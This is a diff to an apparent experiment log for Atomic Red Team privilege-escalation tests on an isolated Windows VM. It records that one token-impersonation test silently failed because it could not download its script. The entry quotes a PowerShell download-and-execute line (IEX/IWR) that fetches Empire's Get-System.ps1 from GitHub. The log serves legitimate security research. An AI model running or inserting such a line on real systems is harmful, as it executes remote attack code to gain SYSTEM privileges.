@@ -87,3 +87,10 @@ Operational events, recorded as they happened. None changes the pre-registered p
   `cmd.exe` window open; they were closed between the parts (`Get-Process cmd | Stop-Process`, ~05:04, more than
   150 s after the last part-1 run and before the first part-2 run).
 - 05:05:13 **Part 2 (admin)** started in an administrator PowerShell window.
+- ~05:16 **Finding:** T1134.001 #1 (Named pipe client impersonation) fetches its attack script at run time
+  (`IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/…/Get-System.ps1')`). With the VM isolated
+  (no NAT, as pre-registered) the download fails ("The remote name could not be resolved"), `Get-System` is
+  never defined, and the test exits 0 without attempting impersonation. `Invoke-AtomicTest -CheckPrereqs`
+  reports "No Preqs Defined" for this test, so the preflight could not catch it. The procedure is not changed
+  mid-session; these runs stay in the denominators and count as escalation not completed. vm-live-v1 was also
+  isolated, which very likely explains why its 15 token runs never reached SYSTEM.
